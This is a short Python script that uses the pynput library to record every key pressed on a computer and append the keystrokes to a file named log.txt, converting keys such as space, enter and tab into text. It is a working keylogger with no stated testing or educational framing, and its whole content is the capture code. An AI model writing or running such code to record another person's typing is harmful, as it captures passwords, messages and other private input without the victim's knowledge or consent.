from pynput.keyboard import Listener


def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift_r':#jkhyi am freaking
        letter = ''
    if letter == "Key.ctrl_l":
        letter = ""
    if letter == "Key.enter":
        letter = "\n"
    if letter == "Key.backspace":
        letter = ""
    if letter == "Key.tab":
        letter = "\t"
    if letter == "Key.caps_lock":
        letter = ""
    if letter == "Key.esc":
        letter = ""
    if letter == "Key.cmd":
        letter = ""
    if letter == "Key.alt_l":
        letter = ""
    if letter == "Key.alt_gr":
        letter = ""

    with open("log.txt", 'a') as f:
        f.write(letter)



with Listener(on_press=write_to_file) as l:
    l.join()
